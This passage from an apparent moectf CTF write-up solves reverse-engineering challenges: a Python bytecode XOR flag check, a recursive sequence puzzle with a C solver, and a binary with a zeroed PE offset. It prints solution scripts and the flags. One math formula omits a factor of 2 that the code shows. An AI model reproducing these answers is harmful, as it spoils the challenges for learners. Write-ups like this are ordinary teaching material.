class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line">[Code]</span><br><span class="line">    File Name: Midpython.py</span><br><span class="line">    Object Name: &lt;module&gt;</span><br><span class="line">    Arg Count: 0</span><br><span class="line">    Pos Only Arg Count: 0</span><br><span class="line">    KW Only Arg Count: 0</span><br><span class="line">    Locals: 0</span><br><span class="line">    Stack Size: 5</span><br><span class="line">    Flags: 0x00000040 (CO_NOFREE)</span><br><span class="line">    [Names]</span><br><span class="line">        &#x27;key&#x27;</span><br><span class="line">        &#x27;xxor&#x27;</span><br><span class="line">        &#x27;xoor&#x27;</span><br><span class="line">        &#x27;xorr&#x27;</span><br><span class="line">        &#x27;len&#x27;</span><br><span class="line">        &#x27;length&#x27;</span><br><span class="line">        &#x27;input&#x27;</span><br><span class="line">        &#x27;ipt&#x27;</span><br><span class="line">        &#x27;flag&#x27;</span><br><span class="line">        &#x27;range&#x27;</span><br><span class="line">        &#x27;i&#x27;</span><br><span class="line">        &#x27;ord&#x27;</span><br><span class="line">        &#x27;print&#x27;</span><br><span class="line">    [Var Names]</span><br><span class="line">    [Free Vars]</span><br><span class="line">    [Cell Vars]</span><br><span class="line">    [Constants]</span><br><span class="line">        (</span><br><span class="line">            69</span><br><span class="line">            70</span><br><span class="line">            79</span><br><span class="line">            72</span><br><span class="line">            88</span><br><span class="line">            75</span><br><span class="line">            85</span><br><span class="line">            127</span><br><span class="line">            89</span><br><span class="line">            85</span><br><span class="line">            74</span><br><span class="line">            19</span><br><span class="line">            74</span><br><span class="line">            122</span><br><span class="line">            107</span><br><span class="line">            103</span><br><span class="line">            75</span><br><span class="line">            77</span><br><span class="line">            9</span><br><span class="line">            73</span><br><span class="line">            29</span><br><span class="line">            28</span><br><span class="line">            67</span><br><span class="line">        )</span><br><span class="line">        [Code]</span><br><span class="line">            File Name: Midpython.py</span><br><span class="line">            Object Name: &lt;lambda&gt;</span><br><span class="line">            Arg Count: 2</span><br><span class="line">            Pos Only Arg Count: 0</span><br><span class="line">            KW Only Arg Count: 0</span><br><span class="line">            Locals: 2</span><br><span class="line">            Stack Size: 2</span><br><span class="line">            Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)</span><br><span class="line">            [Names]</span><br><span class="line">            [Var Names]</span><br><span class="line">                &#x27;x&#x27;</span><br><span class="line">                &#x27;y&#x27;</span><br><span class="line">            [Free Vars]</span><br><span class="line">            [Cell Vars]</span><br><span class="line">            [Constants]</span><br><span class="line">                None</span><br><span class="line">                11</span><br><span class="line">            [Disassembly]</span><br><span class="line">                0       LOAD_FAST               0: x</span><br><span class="line">                2       LOAD_FAST               1: y</span><br><span class="line">                4       BINARY_XOR</span><br><span class="line">                6       LOAD_CONST              1: 11</span><br><span class="line">                8       BINARY_XOR</span><br><span class="line">                10      RETURN_VALUE</span><br><span class="line">        &#x27;&lt;lambda&gt;&#x27;</span><br><span class="line">        [Code]</span><br><span class="line">            File Name: Midpython.py</span><br><span class="line">            Object Name: &lt;lambda&gt;</span><br><span class="line">            Arg Count: 2</span><br><span class="line">            Pos Only Arg Count: 0</span><br><span class="line">            KW Only Arg Count: 0</span><br><span class="line">            Locals: 2</span><br><span class="line">            Stack Size: 3</span><br><span class="line">            Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)</span><br><span class="line">            [Names]</span><br><span class="line">                &#x27;xxor&#x27;</span><br><span class="line">            [Var Names]</span><br><span class="line">                &#x27;x&#x27;</span><br><span class="line">                &#x27;y&#x27;</span><br><span class="line">            [Free Vars]</span><br><span class="line">            [Cell Vars]</span><br><span class="line">            [Constants]</span><br><span class="line">                None</span><br><span class="line">                45</span><br><span class="line">            [Disassembly]</span><br><span class="line">                0       LOAD_GLOBAL             0: xxor</span><br><span class="line">                2       LOAD_FAST               0: x</span><br><span class="line">                4       LOAD_FAST               1: y</span><br><span class="line">                6       CALL_FUNCTION           2</span><br><span class="line">                8       LOAD_CONST              1: 45</span><br><span class="line">                10      BINARY_XOR</span><br><span class="line">                12      RETURN_VALUE</span><br><span class="line">        [Code]</span><br><span class="line">            File Name: Midpython.py</span><br><span class="line">            Object Name: &lt;lambda&gt;</span><br><span class="line">            Arg Count: 2</span><br><span class="line">            Pos Only Arg Count: 0</span><br><span class="line">            KW Only Arg Count: 0</span><br><span class="line">            Locals: 2</span><br><span class="line">            Stack Size: 3</span><br><span class="line">            Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)</span><br><span class="line">            [Names]</span><br><span class="line">                &#x27;xoor&#x27;</span><br><span class="line">            [Var Names]</span><br><span class="line">                &#x27;x&#x27;</span><br><span class="line">                &#x27;y&#x27;</span><br><span class="line">            [Free Vars]</span><br><span class="line">            [Cell Vars]</span><br><span class="line">            [Constants]</span><br><span class="line">                None</span><br><span class="line">                14</span><br><span class="line">            [Disassembly]</span><br><span class="line">                0       LOAD_GLOBAL             0: xoor</span><br><span class="line">                2       LOAD_FAST               0: x</span><br><span class="line">                4       LOAD_FAST               1: y</span><br><span class="line">                6       CALL_FUNCTION           2</span><br><span class="line">                8       LOAD_CONST              1: 14</span><br><span class="line">                10      BINARY_XOR</span><br><span class="line">                12      RETURN_VALUE</span><br><span class="line">        &#x27;&gt;&gt;&gt;input your flag:\n&gt;&gt;&gt;&#x27;</span><br><span class="line">        1</span><br><span class="line">        0</span><br><span class="line">        &#x27;&gt;&gt;&gt;Right!!&#x27;</span><br><span class="line">        &#x27;&gt;&gt;&gt;Wrong!!&#x27;</span><br><span class="line">        None</span><br><span class="line">    [Disassembly]</span><br><span class="line">        0       BUILD_LIST              0</span><br><span class="line">        2       LOAD_CONST              0: (69, 70, 79, 72, 88, 75, 85, 127, 89, 85, 74, 19, 74, 122, 107, 103, 75, 77, 9, 73, 29, 28, 67)</span><br><span class="line">        4       LIST_EXTEND             1</span><br><span class="line">        6       STORE_NAME              0: key</span><br><span class="line">        8       LOAD_CONST              1: &lt;CODE&gt; &lt;lambda&gt;</span><br><span class="line">        10      LOAD_CONST              2: &#x27;&lt;lambda&gt;&#x27;</span><br><span class="line">        12      MAKE_FUNCTION           0</span><br><span class="line">        14      STORE_NAME              1: xxor</span><br><span class="line">        16      LOAD_CONST              3: &lt;CODE&gt; &lt;lambda&gt;</span><br><span class="line">        18      LOAD_CONST              2: &#x27;&lt;lambda&gt;&#x27;</span><br><span class="line">        20      MAKE_FUNCTION           0</span><br><span class="line">        22      STORE_NAME              2: xoor</span><br><span class="line">        24      LOAD_CONST              4: &lt;CODE&gt; &lt;lambda&gt;</span><br><span class="line">        26      LOAD_CONST              2: &#x27;&lt;lambda&gt;&#x27;</span><br><span class="line">        28      MAKE_FUNCTION           0</span><br><span class="line">        30      STORE_NAME              3: xorr</span><br><span class="line">        32      LOAD_NAME               4: len</span><br><span class="line">        34      LOAD_NAME               0: key</span><br><span class="line">        36      CALL_FUNCTION           1</span><br><span class="line">        38      STORE_NAME              5: length</span><br><span class="line">        40      LOAD_NAME               6: input</span><br><span class="line">        42      LOAD_CONST              5: &#x27;&gt;&gt;&gt;input your flag:\n&gt;&gt;&gt;&#x27;</span><br><span class="line">        44      CALL_FUNCTION           1</span><br><span class="line">        46      STORE_NAME              7: ipt</span><br><span class="line">        48      LOAD_CONST              6: 1</span><br><span class="line">        50      STORE_NAME              8: flag</span><br><span class="line">        52      LOAD_NAME               4: len</span><br><span class="line">        54      LOAD_NAME               7: ipt</span><br><span class="line">        56      CALL_FUNCTION           1</span><br><span class="line">        58      LOAD_NAME               5: length</span><br><span class="line">        60      COMPARE_OP              2 (==)</span><br><span class="line">        62      POP_JUMP_IF_FALSE       114</span><br><span class="line">        64      LOAD_NAME               9: range</span><br><span class="line">        66      LOAD_NAME               5: length</span><br><span class="line">        68      CALL_FUNCTION           1</span><br><span class="line">        70      GET_ITER</span><br><span class="line">        72      FOR_ITER                38 (to 112)</span><br><span class="line">        74      STORE_NAME              10: i</span><br><span class="line">        76      LOAD_NAME               3: xorr</span><br><span class="line">        78      LOAD_NAME               11: ord</span><br><span class="line">        80      LOAD_NAME               7: ipt</span><br><span class="line">        82      LOAD_NAME               10: i</span><br><span class="line">        84      BINARY_SUBSCR</span><br><span class="line">        86      CALL_FUNCTION           1</span><br><span class="line">        88      LOAD_NAME               10: i</span><br><span class="line">        90      CALL_FUNCTION           2</span><br><span class="line">        92      LOAD_NAME               0: key</span><br><span class="line">        94      LOAD_NAME               10: i</span><br><span class="line">        96      BINARY_SUBSCR</span><br><span class="line">        98      COMPARE_OP              3 (!=)</span><br><span class="line">        100     POP_JUMP_IF_FALSE       72</span><br><span class="line">        102     LOAD_CONST              7: 0</span><br><span class="line">        104     STORE_NAME              8: flag</span><br><span class="line">        106     POP_TOP</span><br><span class="line">        108     JUMP_ABSOLUTE           118</span><br><span class="line">        110     JUMP_ABSOLUTE           72</span><br><span class="line">        112     JUMP_FORWARD            4 (to 118)</span><br><span class="line">        114     LOAD_CONST              7: 0</span><br><span class="line">        116     STORE_NAME              8: flag</span><br><span class="line">        118     LOAD_NAME               8: flag</span><br><span class="line">        120     LOAD_CONST              6: 1</span><br><span class="line">        122     COMPARE_OP              2 (==)</span><br><span class="line">        124     POP_JUMP_IF_FALSE       136</span><br><span class="line">        126     LOAD_NAME               12: print</span><br><span class="line">        128     LOAD_CONST              8: &#x27;&gt;&gt;&gt;Right!!&#x27;</span><br><span class="line">        130     CALL_FUNCTION           1</span><br><span class="line">        132     POP_TOP</span><br><span class="line">        134     JUMP_FORWARD            8 (to 144)</span><br><span class="line">        136     LOAD_NAME               12: print</span><br><span class="line">        138     LOAD_CONST              9: &#x27;&gt;&gt;&gt;Wrong!!&#x27;</span><br><span class="line">        140     CALL_FUNCTION           1</span><br><span class="line">        142     POP_TOP</span><br><span class="line">        144     LOAD_CONST              10: None</span><br><span class="line">        146     RETURN_VALUE</span><br></pre></td></tr></table></figure><p>“说人话?”<br>好吧原来的人工反编译结果找不到了, 直接把官方WP搬过来:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">69</span>, <span class="number">70</span>, <span class="number">79</span>, <span class="number">72</span>, <span class="number">88</span>, <span class="number">75</span>, <span class="number">85</span>, <span class="number">127</span>, <span class="number">89</span>, <span class="number">85</span>, <span class="number">74</span>, <span class="number">19</span>, <span class="number">74</span>, <span class="number">122</span>, <span class="number">107</span>, <span class="number">103</span>, <span class="number">75</span>, <span class="number">77</span>, <span class="number">9</span>, <span class="number">73</span>, <span class="number">29</span>, <span class="number">28</span>, <span class="number">67</span>]</span><br><span class="line">xxor = <span class="keyword">lambda</span> x, y: (x ^ y) ^ <span class="number">11</span></span><br><span class="line">xoor = <span class="keyword">lambda</span> x, y: xxor(x, y) ^ <span class="number">45</span></span><br><span class="line">xorr = <span class="keyword">lambda</span> x, y: xoor(x, y) ^ <span class="number">14</span></span><br><span class="line">length = <span class="built_in">len</span>(key)</span><br><span class="line">ipt = <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt;input your flag:\n&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(ipt) == length:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="keyword">if</span> xorr(<span class="built_in">ord</span>(ipt[i]), i) != key[i]:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt;Right!!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt;Wrong!!&quot;</span>)</span><br></pre></td></tr></table></figure><p>解密:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">69</span>, <span class="number">70</span>, <span class="number">79</span>, <span class="number">72</span>, <span class="number">88</span>, <span class="number">75</span>, <span class="number">85</span>, <span class="number">127</span>, <span class="number">89</span>, <span class="number">85</span>, <span class="number">74</span>, <span class="number">19</span>, <span class="number">74</span>, <span class="number">122</span>, <span class="number">107</span>, <span class="number">103</span>, <span class="number">75</span>, <span class="number">77</span>, <span class="number">9</span>, <span class="number">73</span>, <span class="number">29</span>, <span class="number">28</span>, <span class="number">67</span>]</span><br><span class="line">xxor = <span class="keyword">lambda</span> x, y: (x ^ y) ^ <span class="number">11</span></span><br><span class="line">xoor = <span class="keyword">lambda</span> x, y: xxor(x, y) ^ <span class="number">45</span></span><br><span class="line">xorr = <span class="keyword">lambda</span> x, y: xoor(x, y) ^ <span class="number">14</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(xorr((key[i]), i)), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>moectf{Pyth0n_M@st3r!!}</p></blockquote><h3 id="ez-Algorithm"><a href="#ez-Algorithm" class="headerlink" title="ez_Algorithm"></a>ez_Algorithm</h3><p>逆向出来发现一个使用递归(效率很低)的算法:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">fuck</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)a1;</span><br><span class="line">  v2 = fuck((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">return</span> v2 + <span class="number">2</span> * (<span class="keyword">unsigned</span> <span class="keyword">int</span>)fuck((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">2</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写成数学式就是:</p><script type="math/tex; mode=display">fuck(n)=\left\{\begin{aligned}n & , & 0 \leq n \lt 2 \\fuck(n-1) + fuck(n-2) & , & n \geq 2 \\\end{aligned}\right.</script><p>让我们帮它优化亿下:</p><script type="math/tex; mode=display">fuck(n)=\left\{\begin{aligned}n & , & 0 \leq n \lt 2 \\fuck(n-2) + 2^{n-2} & , & n \geq 2 \\\end{aligned}\right.</script><p>就不求通项了, 反正速度也挺快-_-:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> key[] = &#123;<span class="number">0x6D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x21</span>, <span class="number">0x55</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xCD</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x00</span>, <span class="number">0x2E</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x9F</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x33</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x9C</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x66</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xD9</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x0A</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xCA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x64</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x9A</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x0A</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x9C</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x3D</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x9A</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x26</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xF4</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x62</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x9A</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x38</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x98</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x2B</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x65</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xF4</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x2C</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x9B</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x20</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xF4</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x27</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x98</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x34</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x9A</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x64</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xD1</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x66</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xF4</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x62</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x66</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xF4</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x38</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x98</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x34</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xC5</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x64</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xC5</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x32</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xF4</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x65</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xCD</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x0A</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xFF</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x64</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xC6</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x66</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xF4</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x36</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x9B</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x38</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xDB</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x64</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x98</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x2D</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x9A</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x62</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xD2</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x6A</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x94</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x6A</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xD6</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">fuck</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> r = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">1</span>) <span class="keyword">return</span> n;</span><br><span class="line">    <span class="keyword">if</span> (n &gt;= <span class="number">34</span>) n = (n &amp; <span class="number">1</span>) ? <span class="number">33</span> : <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">while</span> (n &gt; <span class="number">1</span>)&#123;</span><br><span class="line">        n -= <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (n &lt; <span class="number">32</span>) r |= <span class="number">1</span> &lt;&lt; n;</span><br><span class="line">    &#125;</span><br><span class="line">    r |= n;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint32_t</span> *flag = (<span class="keyword">const</span> <span class="keyword">uint32_t</span> *)key;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">75</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">putchar</span>(fuck(i * i) ^ flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(getchar() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总之这个题很有意思, 它让我想起了被数列支配的恐惧.</p><blockquote><p>moectf{4f73r_a11_7h1s_71m3~D0_y0u_r3a11z3_7h3_m3an1ng_0f_T1m3_c0mp13x17y???}</p></blockquote><h3 id="PEPEPE"><a href="#PEPEPE" class="headerlink" title="PEPEPE"></a>PEPEPE</h3><p>打开IDA, 诶, 怎么变16位程序了?</p><blockquote><p>科普一下, PE是32/64位Windows下的可执行文件, 其中一个特点为能在对应系统下运行以外, 还能在16位DOS下运行(虽然运行结果只是提示一条消息). 这是Windows的一贯作风: 在版本更迭时, 仍然会保持变态的兼容性, 甚至因此现在Windows下的路径分隔符仍然是反斜杠而不是更有现代风格的斜杠. 所以, 你可以永远相信Windows的向下兼容能力, 虽然说向下兼容有好有坏.</p></blockquote><p>IDA没有识别到PE头, 只识别到MZ头. 用16进制打开发现PE偏移被置零了(0x3C处). 把PE偏移填上0x00000080就OK了. 深入了解PE结构, 可以看看《Windows PE权威指南》</p><p>现在再打开IDA, 发现这次正常了. 在main中可以直接看到加密的全过程:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v4; <span class="comment">// [esp+18h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+1Ch] 